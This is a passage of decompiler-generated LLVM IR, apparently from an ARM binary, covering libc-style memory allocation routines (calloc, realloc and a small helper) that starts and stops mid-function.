  uselistorder label %dec_label_pc_120d0.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_12094, { 1, 0 }
  uselistorder label %dec_label_pc_12048, { 1, 0 }
  uselistorder label %dec_label_pc_11fdc, { 1, 0 }
  uselistorder label %dec_label_pc_11fd8, { 1, 0 }
  uselistorder label %dec_label_pc_11f84, { 1, 0 }
  uselistorder label %dec_label_pc_11f70, { 2, 0, 1 }
  uselistorder label %dec_label_pc_11f38, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_11f24, { 1, 0 }
  uselistorder label %bb143, { 1, 0 }
  uselistorder label %bb141, { 1, 0 }
}

define i32 @function_125f8(i32 %arg1) local_unnamed_addr {
dec_label_pc_125f8:
  %v0_125f8 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_125f8, label %bb, label %.thread3

bb:                                               ; preds = %dec_label_pc_125f8
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_125f8, %bb
  %v4_12614 = phi i32 [ %arg1, %dec_label_pc_125f8 ], [ 0, %bb ]
  ret i32 %v4_12614

; uselistorder directives
  uselistorder label %.thread3, { 1, 0 }
}

define i32 @calloc(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %v3_12618 = load i32, i32* @r4, align 4
  %v6_12618 = load i32, i32* @r5, align 4
  %v9_12618 = load i32, i32* @r6, align 4
  %v12_12618 = load i32, i32* @lr, align 4
  %v2_12620 = icmp eq i32 %arg1, 0
  store i32 ptrtoint (i32* @global_var_219e0.355 to i32), i32* @r5, align 4
  store i32 %arg2, i32* %r4.global-to-local, align 4
  %v2_12630 = mul i32 %arg2, %arg1
  store i32 %v2_12630, i32* @r6, align 4
  br i1 %v2_12620, label %dec_label_pc_12668, label %dec_label_pc_12638

dec_label_pc_12638:                               ; preds = %entry
  store i32 %arg1, i32* @r1, align 4
  %v2_12640 = udiv i32 %v2_12630, %arg1
  %v9_12644 = icmp eq i32 %v2_12640, %arg2
  br i1 %v9_12644, label %dec_label_pc_12668, label %dec_label_pc_1264c

dec_label_pc_1264c:                               ; preds = %dec_label_pc_12638
  %v0_12650 = call i32 @__aeabi_read_tp()
  %v3_12654 = load i16, i16* @global_var_21a38.351, align 2
  %v4_12654 = sext i16 %v3_12654 to i32
  store i32 0, i32* %r4.global-to-local, align 4
  %v3_12660 = add i32 %v4_12654, %v0_12650
  %v4_12660 = inttoptr i32 %v3_12660 to i32*
  store i32 12, i32* %v4_12660, align 4
  br label %dec_label_pc_1272c

dec_label_pc_12668:                               ; preds = %dec_label_pc_12638, %entry
  %v4_1266c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_219e0.355 to i32), i32 108) to i32*), align 4
  store i32 %v4_1266c, i32* @r4, align 4
  %v4_12684 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_219e0.355 to i32), i32 112) to i32*), align 4
  store i32 %v4_12684, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_12684)
  %v0_12698 = load i32, i32* @r5, align 4
  %v2_12698 = add i32 %v0_12698, 16
  %v3_12698 = inttoptr i32 %v2_12698 to i32*
  %v4_12698 = load i32, i32* %v3_12698, align 4
  store i32 %v4_12698, i32* %ip.global-to-local, align 4
  store i32 75428, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_12698)
  %v0_126a4 = load i32, i32* @r6, align 4
  store i32 %v0_126a4, i32* @r0, align 4
  %v0_126a8 = call i32 @malloc()
  store i32 %v0_126a8, i32* %r4.global-to-local, align 4
  %v2_126ac = icmp eq i32 %v0_126a8, 0
  br i1 %v2_126ac, label %.thread, label %dec_label_pc_126b4

dec_label_pc_126b4:                               ; preds = %dec_label_pc_12668
  %v1_126b4 = add i32 %v0_126a8, -4
  %v2_126b4 = inttoptr i32 %v1_126b4 to i32*
  %v3_126b4 = load i32, i32* %v2_126b4, align 4
  %v1_126b8 = and i32 %v3_126b4, 2
  %v2_126b8 = icmp eq i32 %v1_126b8, 0
  br i1 %v2_126b8, label %dec_label_pc_126c0, label %.thread

dec_label_pc_126c0:                               ; preds = %dec_label_pc_126b4
  %v1_126c06 = add i32 %v3_126b4, -4
  %v1_126c4 = and i32 %v1_126c06, -4
  %v3_126c8 = udiv i32 %v1_126c4, 4
  store i32 %v3_126c8, i32* %ip.global-to-local, align 4
  %tmp = icmp eq i32 %v1_126c4, 36
  %v2_126d0 = icmp ult i32 %v1_126c4, 33
  %v3_126d0 = or i1 %tmp, %v2_126d0
  br i1 %v3_126d0, label %dec_label_pc_126dc, label %dec_label_pc_126d4

dec_label_pc_126d4:                               ; preds = %dec_label_pc_126c0
  %v3_126d4 = inttoptr i32 %v0_126a8 to i8*
  %v4_126d4 = call i32 @__GI_memset(i8* %v3_126d4, i32 0, i32 %v1_126c4)
  br label %.thread

dec_label_pc_126dc:                               ; preds = %dec_label_pc_126c0
  %tmp7 = icmp eq i32 %v1_126c4, 16
  %v2_126e0 = inttoptr i32 %v0_126a8 to i32*
  store i32 0, i32* %v2_126e0, align 4
  %v1_126e4 = load i32, i32* %r4.global-to-local, align 4
  %v2_126e4 = add i32 %v1_126e4, 4
  %v3_126e4 = inttoptr i32 %v2_126e4 to i32*
  store i32 0, i32* %v3_126e4, align 4
  %v1_126e8 = load i32, i32* %r4.global-to-local, align 4
  %v2_126e8 = add i32 %v1_126e8, 8
  %v3_126e8 = inttoptr i32 %v2_126e8 to i32*
  store i32 0, i32* %v3_126e8, align 4
  %v2_126ec = icmp ult i32 %v1_126c4, 13
  %v3_126ec = or i1 %tmp7, %v2_126ec
  br i1 %v3_126ec, label %.thread, label %dec_label_pc_126f0

dec_label_pc_126f0:                               ; preds = %dec_label_pc_126dc
  %v0_126f0 = load i32, i32* %ip.global-to-local, align 4
  %v1_126f4 = load i32, i32* %r4.global-to-local, align 4
  %v2_126f4 = add i32 %v1_126f4, 12
  %v3_126f4 = inttoptr i32 %v2_126f4 to i32*
  store i32 0, i32* %v3_126f4, align 4
  %v1_126f8 = load i32, i32* %r4.global-to-local, align 4
  %v2_126f8 = add i32 %v1_126f8, 16
  %v3_126f8 = inttoptr i32 %v2_126f8 to i32*
  store i32 0, i32* %v3_126f8, align 4
  %tmp8 = icmp ult i32 %v0_126f0, 7
  br i1 %tmp8, label %.thread, label %dec_label_pc_12700

dec_label_pc_12700:                               ; preds = %dec_label_pc_126f0
  %v0_12700 = load i32, i32* %ip.global-to-local, align 4
  %v7_12700 = icmp eq i32 %v0_12700, 9
  %v1_12704 = load i32, i32* %r4.global-to-local, align 4
  %v2_12704 = add i32 %v1_12704, 20
  %v3_12704 = inttoptr i32 %v2_12704 to i32*
  store i32 0, i32* %v3_12704, align 4
  %v1_12708 = load i32, i32* %r4.global-to-local, align 4
  %v2_12708 = add i32 %v1_12708, 24
  %v3_12708 = inttoptr i32 %v2_12708 to i32*
  store i32 0, i32* %v3_12708, align 4
  br i1 %v7_12700, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_12700
  %v2_1270c = load i32, i32* %r4.global-to-local, align 4
  %v3_1270c = add i32 %v2_1270c, 32
  %v4_1270c = inttoptr i32 %v3_1270c to i32*
  store i32 0, i32* %v4_1270c, align 4
  %v2_12710 = load i32, i32* %r4.global-to-local, align 4
  %v3_12710 = add i32 %v2_12710, 28
  %v4_12710 = inttoptr i32 %v3_12710 to i32*
  store i32 0, i32* %v4_12710, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_12700, %dec_label_pc_126b4, %dec_label_pc_126f0, %dec_label_pc_126dc, %dec_label_pc_12668, %dec_label_pc_126d4, %bb
  store i32 1, i32* @r1, align 4
  %v0_12720 = load i32, i32* @r5, align 4
  %v2_12720 = add i32 %v0_12720, 44
  %v3_12720 = inttoptr i32 %v2_12720 to i32*
  %v4_12720 = load i32, i32* %v3_12720, align 4
  store i32 %v4_12720, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_12720)
  br label %dec_label_pc_1272c

dec_label_pc_1272c:                               ; preds = %dec_label_pc_1264c, %.thread
  %v0_1272c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v3_12618, i32* @r4, align 4
  store i32 %v6_12618, i32* @r5, align 4
  store i32 %v9_12618, i32* @r6, align 4
  store i32 %v12_12618, i32* @lr, align 4
  ret i32 %v0_1272c

; uselistorder directives
  uselistorder i32 %v1_126c4, { 0, 5, 2, 1, 4, 3 }
  uselistorder i32 %v0_126a8, { 0, 2, 1, 3, 4 }
  uselistorder i32* %r4.global-to-local, { 9, 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 11 }
  uselistorder i32 33, { 0, 8, 1, 2, 3, 4, 5, 6, 7 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_1272c, { 1, 0 }
  uselistorder label %.thread, { 6, 0, 2, 3, 5, 1, 4 }
}

define i32 @realloc(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %stack_var_-56 = alloca i32, align 4
  %v3_12758 = load i32, i32* @r4, align 4
  %v6_12758 = load i32, i32* @r5, align 4
  %v9_12758 = load i32, i32* @r6, align 4
  %v12_12758 = load i32, i32* @r7, align 4
  %v15_12758 = load i32, i32* @r8, align 4
  %v18_12758 = load i32, i32* @sb, align 4
  %v21_12758 = load i32, i32* @sl, align 4
  %v24_12758 = load i32, i32* @fp, align 4
  %v27_12758 = load i32, i32* @lr, align 4
  store i32 %tmp, i32* @r5, align 4
  %v2_12764 = icmp eq i32* %arg1, null
  store i32 ptrtoint (i32* @global_var_219e0.355 to i32), i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* @r6, align 4
  br i1 %v2_12764, label %dec_label_pc_12778, label %dec_label_pc_12788

dec_label_pc_12778:                               ; preds = %entry
  store i32 %arg2, i32* @r0, align 4
  %v0_1277c = call i32 @malloc()
  store i32 %v0_1277c, i32* %r0.global-to-local, align 4
  store i32 %v0_1277c, i32* @r4, align 4
  br label %dec_label_pc_12ae8

dec_label_pc_12788:                               ; preds = %entry
  %v2_12788 = icmp eq i32 %arg2, 0
  br i1 %v2_12788, label %dec_label_pc_12790, label %dec_label_pc_1279c

dec_label_pc_12790:                               ; preds = %dec_label_pc_12788
  %v0_12790 = call i32 @free()
  store i32 %v0_12790, i32* %r0.global-to-local, align 4
  %v0_12794 = load i32, i32* @r6, align 4
  store i32 %v0_12794, i32* @r4, align 4
  br label %dec_label_pc_12ae8

dec_label_pc_1279c:                               ; preds = %dec_label_pc_12788
  store i32 108, i32* %r3.global-to-local, align 4
  %v4_127a4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_219e0.355 to i32), i32 108) to i32*), align 4
  store i32 %v4_127a4, i32* @r4, align 4
  store i32 68, i32* %r3.global-to-local, align 4
  store i32 %v4_127a4, i32* %r2.global-to-local, align 4
  %v4_127b0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_219e0.355 to i32), i32 68) to i32*), align 4
  store i32 %v4_127b0, i32* %r1.global-to-local, align 4
  %v2_127b4 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_127b4, i32* %r0.global-to-local, align 4
  store i32 112, i32* %r3.global-to-local, align 4
  %v4_127bc = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_219e0.355 to i32), i32 112) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_127bc)
  %v0_127c8 = load i32, i32* @r4, align 4
  store i32 %v0_127c8, i32* %r0.global-to-local, align 4
  store i32 16, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_219e0.355 to i32), i32* %r1.global-to-local, align 4
  %v4_127d4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_219e0.355 to i32), i32 16) to i32*), align 4
  store i32 ptrtoint (i32* @global_var_127e0.457 to i32), i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_127d4)
  %v0_127e0 = load i32, i32* @r6, align 4
  %tmp36 = icmp ult i32 %v0_127e0, -32
  br i1 %tmp36, label %dec_label_pc_12804, label %dec_label_pc_127e8

dec_label_pc_127e8:                               ; preds = %dec_label_pc_1279c
  store i32 ptrtoint (i32* @global_var_f240.459 to i32), i32* %r2.global-to-local, align 4
  %v0_127ec = call i32 @__aeabi_read_tp()
  store i32 %v0_127ec, i32* %r0.global-to-local, align 4
  %v3_127f0 = load i16, i16* @global_var_21a38.351, align 2
  %v4_127f0 = sext i16 %v3_127f0 to i32
  store i32 %v4_127f0, i32* %r2.global-to-local, align 4
  store i32 12, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v3_127fc = add i32 %v4_127f0, %v0_127ec
  %v4_127fc = inttoptr i32 %v3_127fc to i32*
  store i32 12, i32* %v4_127fc, align 4
  br label %dec_label_pc_12ae8

dec_label_pc_12804:                               ; preds = %dec_label_pc_1279c
  %v1_12804 = add i32 %v0_127e0, 11
  store i32 %v1_12804, i32* %r0.global-to-local, align 4
  %v0_12808 = load i32, i32* @r5, align 4
  %v1_12808 = add i32 %v0_12808, -4
  %v2_12808 = inttoptr i32 %v1_12808 to i32*
  %v3_12808 = load i32, i32* %v2_12808, align 4
  store i32 %v3_12808, i32* %r2.global-to-local, align 4
  %v2_1280c = icmp ugt i32 %v1_12804, 14
  %v7_1280c = icmp eq i32 %v1_12804, 15
  %v2_12810 = xor i1 %v2_1280c, true
  %v3_12810 = or i1 %v7_1280c, %v2_12810
  br i1 %v3_12810, label %bb, label %bb27

bb:                                               ; preds = %dec_label_pc_12804
  store i32 16, i32* @sb, align 4
  br label %bb27

bb27:                                             ; preds = %dec_label_pc_12804, %bb
  %v2_12814 = xor i1 %v7_1280c, true
  %v3_12814 = and i1 %v2_1280c, %v2_12814
  br i1 %v3_12814, label %bb28, label %bb29

bb28:                                             ; preds = %bb27
  %v5_12814 = and i32 %v1_12804, -8
  store i32 %v5_12814, i32* @sb, align 4
  br label %bb29

bb29:                                             ; preds = %bb27, %bb28
  %v1_12818 = and i32 %v3_12808, 2
  %v2_12818 = icmp eq i32 %v1_12818, 0
  %v1_1281c = add i32 %v0_12808, -8
  store i32 %v1_1281c, i32* @sl, align 4
  %v1_12820 = and i32 %v3_12808, -4
  store i32 %v1_12820, i32* @r6, align 4
  br i1 %v2_12818, label %dec_label_pc_12828, label %dec_label_pc_12a00

dec_label_pc_12828:                               ; preds = %bb29
  %v1_12828 = load i32, i32* @sb, align 4
  %v3_12828 = icmp ult i32 %v1_12820, %v1_12828
  br i1 %v3_12828, label %dec_label_pc_12834, label %bb30

bb30:                                             ; preds = %dec_label_pc_12828
  store i32 %v1_12820, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_12998

dec_label_pc_12834:                               ; preds = %dec_label_pc_12828
  store i32 64, i32* %r3.global-to-local, align 4
  %v4_1283c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_219e0.355 to i32), i32 64) to i32*), align 4
  store i32 %v4_1283c, i32* %r0.global-to-local, align 4
  %v1_12840 = add i32 %v4_1283c, 44
  %v2_12840 = inttoptr i32 %v1_12840 to i32*
  %v3_12840 = load i32, i32* %v2_12840, align 4
  store i32 %v3_12840, i32* %r3.global-to-local, align 4
  %v2_12844 = add i32 %v1_12820, %v1_1281c
  store i32 %v2_12844, i32* @r4, align 4
  %v9_12848 = icmp eq i32 %v2_12844, %v3_12840
  %v1_1284c = add i32 %v2_12844, 4
  %v2_1284c = inttoptr i32 %v1_1284c to i32*
  %v3_1284c = load i32, i32* %v2_1284c, align 4
  store i32 %v3_1284c, i32* %r1.global-to-local, align 4
  br i1 %v9_12848, label %dec_label_pc_12854, label %dec_label_pc_12890

dec_label_pc_12854:                               ; preds = %dec_label_pc_12834
  %v1_12854 = and i32 %v3_1284c, -4
  %v2_12858 = add i32 %v1_12854, %v1_12820
  store i32 %v2_12858, i32* %r1.global-to-local, align 4
  %v1_1285c = add i32 %v1_12828, 16
  store i32 %v1_1285c, i32* %r3.global-to-local, align 4
  %v3_12860 = icmp ult i32 %v2_12858, %v1_1285c
  br i1 %v3_12860, label %dec_label_pc_128e4, label %dec_label_pc_12868

dec_label_pc_12868:                               ; preds = %dec_label_pc_12854
  %v2_12868 = sub i32 %v2_12858, %v1_12828
  %v1_1286c = urem i32 %v3_12808, 2
  %v2_12870 = add i32 %v1_12828, %v1_1281c
  store i32 %v2_12870, i32* %r1.global-to-local, align 4
  %v2_12874 = or i32 %v1_12828, %v1_1286c
  store i32 %v2_12874, i32* %r2.global-to-local, align 4
  %v1_12878 = or i32 %v2_12868, 1
  store i32 %v1_12878, i32* %r3.global-to-local, align 4
  store i32 %v0_12808, i32* @r4, align 4
  store i32 %v2_12874, i32* %v2_12808, align 4
  %v0_12884 = load i32, i32* %r1.global-to-local, align 4
  %v1_12884 = load i32, i32* %r0.global-to-local, align 4
  %v2_12884 = add i32 %v1_12884, 44
  %v3_12884 = inttoptr i32 %v2_12884 to i32*
  store i32 %v0_12884, i32* %v3_12884, align 4
  %v0_12888 = load i32, i32* %r3.global-to-local, align 4
  %v1_12888 = load i32, i32* %r1.global-to-local, align 4
  %v2_12888 = add i32 %v1_12888, 4
  %v3_12888 = inttoptr i32 %v2_12888 to i32*
  store i32 %v0_12888, i32* %v3_12888, align 4
  br label %dec_label_pc_12acc

dec_label_pc_12890:                               ; preds = %dec_label_pc_12834
  %v1_12890 = and i32 %v3_1284c, -2
  %v2_12894 = add i32 %v1_12890, %v2_12844
  store i32 %v2_12894, i32* %r3.global-to-local, align 4
  %v1_12898 = add i32 %v2_12894, 4
  %v2_12898 = inttoptr i32 %v1_12898 to i32*
  %v3_12898 = load i32, i32* %v2_12898, align 4
  store i32 %v3_12898, i32* %r3.global-to-local, align 4
  %v1_1289c = urem i32 %v3_12898, 2
  %v2_1289c = icmp eq i32 %v1_1289c, 0
  br i1 %v2_1289c, label %dec_label_pc_128a4, label %dec_label_pc_128e4

dec_label_pc_128a4:                               ; preds = %dec_label_pc_12890
  %v1_128a4 = and i32 %v3_1284c, -4
  store i32 %v1_128a4, i32* %r3.global-to-local, align 4
  %v2_128a8 = add i32 %v1_128a4, %v1_12820
  store i32 %v2_128a8, i32* %r0.global-to-local, align 4
  %v3_128ac = icmp ult i32 %v2_128a8, %v1_12828
  br i1 %v3_128ac, label %dec_label_pc_128e4, label %dec_label_pc_128b4

dec_label_pc_128b4:                               ; preds = %dec_label_pc_128a4
  %v1_128b4 = add i32 %v1_12820, %v0_12808
  %v2_128b4 = inttoptr i32 %v1_128b4 to i32*
  %v3_128b4 = load i32, i32* %v2_128b4, align 4
  store i32 %v3_128b4, i32* %r1.global-to-local, align 4
  %v1_128b8 = add i32 %v3_128b4, 12
  %v2_128b8 = inttoptr i32 %v1_128b8 to i32*
  %v3_128b8 = load i32, i32* %v2_128b8, align 4
  store i32 %v3_128b8, i32* %r3.global-to-local, align 4
  %v9_128bc = icmp eq i32 %v3_128b8, %v2_12844
  %v1_128c0 = add i32 %v2_12844, 12
  %v2_128c0 = inttoptr i32 %v1_128c0 to i32*
  %v3_128c0 = load i32, i32* %v2_128c0, align 4
  store i32 %v3_128c0, i32* %r2.global-to-local, align 4
  br i1 %v9_128bc, label %dec_label_pc_128c8, label %dec_label_pc_128d4

dec_label_pc_128c8:                               ; preds = %dec_label_pc_128b4
  %v1_128c8 = add i32 %v3_128c0, 8
  %v2_128c8 = inttoptr i32 %v1_128c8 to i32*
  %v3_128c8 = load i32, i32* %v2_128c8, align 4
  store i32 %v3_128c8, i32* %r3.global-to-local, align 4
  %v9_128cc = icmp eq i32 %v3_128c8, %v2_12844
  br i1 %v9_128cc, label %dec_label_pc_128d8, label %dec_label_pc_128d4

dec_label_pc_128d4:                               ; preds = %dec_label_pc_128b4, %dec_label_pc_128c8
  %v0_128d4 = call i32 @abort()
  store i32 %v0_128d4, i32* %r0.global-to-local, align 4
  %v0_128d8.pre = load i32, i32* @r1, align 4
  %v1_128d8.pre = load i32, i32* @r2, align 4
  br label %dec_label_pc_128d8

dec_label_pc_128d8:                               ; preds = %dec_label_pc_128c8, %dec_label_pc_128d4
  %v1_128d8 = phi i32 [ %v3_128c0, %dec_label_pc_128c8 ], [ %v1_128d8.pre, %dec_label_pc_128d4 ]
  %v0_128d8 = phi i32 [ %v3_128b4, %dec_label_pc_128c8 ], [ %v0_128d8.pre, %dec_label_pc_128d4 ]
  %v2_128d8 = add i32 %v1_128d8, 8
  %v3_128d8 = inttoptr i32 %v2_128d8 to i32*
  store i32 %v0_128d8, i32* %v3_128d8, align 4
  %v0_128dc = load i32, i32* %r2.global-to-local, align 4
  %v1_128dc = load i32, i32* %r1.global-to-local, align 4
  %v2_128dc = add i32 %v1_128dc, 12
  %v3_128dc = inttoptr i32 %v2_128dc to i32*
  store i32 %v0_128dc, i32* %v3_128dc, align 4
  %v1_12998.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_12998

dec_label_pc_128e4:                               ; preds = %dec_label_pc_12854, %dec_label_pc_128a4, %dec_label_pc_12890
  %v1_128e4 = add i32 %v1_12828, -7
  store i32 %v1_128e4, i32* @r0, align 4
  %v0_128e8 = call i32 @malloc()
  store i32 %v0_128e8, i32* @r0, align 4
  store i32 %v0_128e8, i32* %r1.global-to-local, align 4
  %v2_128ec = icmp eq i32 %v0_128e8, 0
  br i1 %v2_128ec, label %bb31, label %dec_label_pc_128f8

bb31:                                             ; preds = %dec_label_pc_128e4
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_12acc

dec_label_pc_128f8:                               ; preds = %dec_label_pc_128e4
  %v1_12900.pre = load i32, i32* @r4, align 4
  %v1_128f8 = add i32 %v0_128e8, -4
  %v2_128f8 = inttoptr i32 %v1_128f8 to i32*
  %v3_128f8 = load i32, i32* %v2_128f8, align 4
  store i32 %v3_128f8, i32* @r3, align 4
  %v1_128fc = add i32 %v0_128e8, -8
  store i32 %v1_128fc, i32* @r7, align 4
  %v9_12900 = icmp eq i32 %v1_128fc, %v1_12900.pre
  br i1 %v9_12900, label %.thread2, label %dec_label_pc_12910

.thread2:                                         ; preds = %dec_label_pc_128f8
  %v2_12904 = and i32 %v3_128f8, -4
  store i32 %v2_12904, i32* %r3.global-to-local, align 4
  %v2_12908 = load i32, i32* @r6, align 4
  %v3_12908 = add i32 %v2_12908, %v2_12904
  store i32 %v3_12908, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_12998

dec_label_pc_12910:                               ; preds = %dec_label_pc_128f8
  %v0_12910 = load i32, i32* @r6, align 4
  %v1_12910 = add i32 %v0_12910, -4
  store i32 %v1_12910, i32* @r2, align 4
  %v3_12914 = udiv i32 %v1_12910, 4
  store i32 %v3_12914, i32* @ip, align 4
  %tmp37 = and i32 %v1_12910, -4
  %tmp38 = icmp eq i32 %tmp37, 36
  %v2_1291c = icmp ult i32 %v1_12910, 36
  %v3_1291c = or i1 %tmp38, %v2_1291c
  %v0_1292c = load i32, i32* @r5, align 4
  br i1 %v3_1291c, label %dec_label_pc_1292c, label %dec_label_pc_12920

dec_label_pc_12920:                               ; preds = %dec_label_pc_12910
  store i32 %v0_1292c, i32* @r1, align 4
  %v0_12924 = call i32 @memcpy()
  store i32 %v0_12924, i32* %r0.global-to-local, align 4
  br label %.thread6

dec_label_pc_1292c:                               ; preds = %dec_label_pc_12910
  %v1_1292c = inttoptr i32 %v0_1292c to i32*
  %v2_1292c = load i32, i32* %v1_1292c, align 4
  store i32 %v2_1292c, i32* %r3.global-to-local, align 4
  %v2_12930 = inttoptr i32 %v0_128e8 to i32*
  store i32 %v2_1292c, i32* %v2_12930, align 4
  %v0_12934 = load i32, i32* @r5, align 4
  %v1_12934 = add i32 %v0_12934, 4
  %v2_12934 = inttoptr i32 %v1_12934 to i32*
  %v3_12934 = load i32, i32* %v2_12934, align 4
  store i32 %v3_12934, i32* %r3.global-to-local, align 4
  %v1_12938 = load i32, i32* %r1.global-to-local, align 4
  %v2_12938 = add i32 %v1_12938, 4
  %v3_12938 = inttoptr i32 %v2_12938 to i32*
  store i32 %v3_12934, i32* %v3_12938, align 4
  %v0_1293c = load i32, i32* @r5, align 4
  %v1_1293c = add i32 %v0_1293c, 8
  %v2_1293c = inttoptr i32 %v1_1293c to i32*
  %v3_1293c = load i32, i32* %v2_1293c, align 4
  store i32 %v3_1293c, i32* %r3.global-to-local, align 4
  %v0_12940 = load i32, i32* @ip, align 4
  %v1_12944 = load i32, i32* %r1.global-to-local, align 4
  %v2_12944 = add i32 %v1_12944, 8
  %v3_12944 = inttoptr i32 %v2_12944 to i32*
  store i32 %v3_1293c, i32* %v3_12944, align 4
  %tmp39 = icmp ult i32 %v0_12940, 5
  br i1 %tmp39, label %.thread6, label %dec_label_pc_1294c

dec_label_pc_1294c:                               ; preds = %dec_label_pc_1292c
  %v0_1294c = load i32, i32* @r5, align 4
  %v1_1294c = add i32 %v0_1294c, 12
  %v2_1294c = inttoptr i32 %v1_1294c to i32*
  %v3_1294c = load i32, i32* %v2_1294c, align 4
  store i32 %v3_1294c, i32* %r3.global-to-local, align 4
  %v1_12950 = load i32, i32* %r1.global-to-local, align 4
  %v2_12950 = add i32 %v1_12950, 12
  %v3_12950 = inttoptr i32 %v2_12950 to i32*
  store i32 %v3_1294c, i32* %v3_12950, align 4
  %v0_12954 = load i32, i32* @r5, align 4
  %v1_12954 = add i32 %v0_12954, 16
  %v2_12954 = inttoptr i32 %v1_12954 to i32*
  %v3_12954 = load i32, i32* %v2_12954, align 4
  store i32 %v3_12954, i32* %r3.global-to-local, align 4
  %v0_12958 = load i32, i32* @ip, align 4
  %v1_1295c = load i32, i32* %r1.global-to-local, align 4
  %v2_1295c = add i32 %v1_1295c, 16
  %v3_1295c = inttoptr i32 %v2_1295c to i32*
  store i32 %v3_12954, i32* %v3_1295c, align 4
  %tmp40 = icmp ult i32 %v0_12958, 7
  br i1 %tmp40, label %.thread6, label %dec_label_pc_12964

dec_label_pc_12964:                               ; preds = %dec_label_pc_1294c
  %v0_12964 = load i32, i32* @r5, align 4
  %v1_12964 = add i32 %v0_12964, 20
  %v2_12964 = inttoptr i32 %v1_12964 to i32*
  %v3_12964 = load i32, i32* %v2_12964, align 4
  store i32 %v3_12964, i32* %r3.global-to-local, align 4
  %v1_12968 = load i32, i32* %r1.global-to-local, align 4
  %v2_12968 = add i32 %v1_12968, 20
  %v3_12968 = inttoptr i32 %v2_12968 to i32*
  store i32 %v3_12964, i32* %v3_12968, align 4
  %v0_1296c = load i32, i32* @r5, align 4
  %v1_1296c = add i32 %v0_1296c, 24
  %v2_1296c = inttoptr i32 %v1_1296c to i32*
  %v3_1296c = load i32, i32* %v2_1296c, align 4
  store i32 %v3_1296c, i32* %r3.global-to-local, align 4
  %v1_12970 = load i32, i32* %r1.global-to-local, align 4
  %v2_12970 = add i32 %v1_12970, 24
  %v3_12970 = inttoptr i32 %v2_12970 to i32*
  store i32 %v3_1296c, i32* %v3_12970, align 4
  %v0_12974 = load i32, i32* @ip, align 4
  %v7_12974 = icmp eq i32 %v0_12974, 9
  br i1 %v7_12974, label %bb32, label %.thread6

bb32:                                             ; preds = %dec_label_pc_12964
  %v1_12978 = load i32, i32* @r5, align 4
  %v2_12978 = add i32 %v1_12978, 28
  %v3_12978 = inttoptr i32 %v2_12978 to i32*
  %v4_12978 = load i32, i32* %v3_12978, align 4
  store i32 %v4_12978, i32* %r3.global-to-local, align 4
  %v2_1297c = load i32, i32* %r1.global-to-local, align 4
  %v3_1297c = add i32 %v2_1297c, 28
  %v4_1297c = inttoptr i32 %v3_1297c to i32*
  store i32 %v4_12978, i32* %v4_1297c, align 4
  %v1_12980 = load i32, i32* @r5, align 4
  %v2_12980 = add i32 %v1_12980, 32
  %v3_12980 = inttoptr i32 %v2_12980 to i32*
  %v4_12980 = load i32, i32* %v3_12980, align 4
  store i32 %v4_12980, i32* %r3.global-to-local, align 4
  %v2_12984 = load i32, i32* %r1.global-to-local, align 4
  %v3_12984 = add i32 %v2_12984, 32
  %v4_12984 = inttoptr i32 %v3_12984 to i32*
  store i32 %v4_12980, i32* %v4_12984, align 4
  br label %.thread6

.thread6:                                         ; preds = %dec_label_pc_12964, %dec_label_pc_1294c, %dec_label_pc_1292c, %dec_label_pc_12920, %bb32
  %v0_12988 = load i32, i32* @r5, align 4
  store i32 %v0_12988, i32* @r0, align 4
  %v0_1298c = call i32 @free()
  store i32 %v0_1298c, i32* %r0.global-to-local, align 4
  %v0_12990 = load i32, i32* @r7, align 4
  %v1_12990 = add i32 %v0_12990, 8
  store i32 %v1_12990, i32* @r4, align 4
  br label %dec_label_pc_12acc

dec_label_pc_12998:                               ; preds = %bb30, %.thread2, %dec_label_pc_128d8
  %v0_129ac = phi i32 [ %v3_12908, %.thread2 ], [ %v1_12820, %bb30 ], [ %v1_12998.pre, %dec_label_pc_128d8 ]
  %v0_12998 = load i32, i32* @sb, align 4
  %v2_12998 = sub i32 %v0_129ac, %v0_12998
  store i32 %v2_12998, i32* %r1.global-to-local, align 4
  %v0_129a0 = load i32, i32* @sl, align 4
  %v1_129a0 = add i32 %v0_129a0, 4
  %v2_129a0 = inttoptr i32 %v1_129a0 to i32*
  %v3_129a0 = load i32, i32* %v2_129a0, align 4
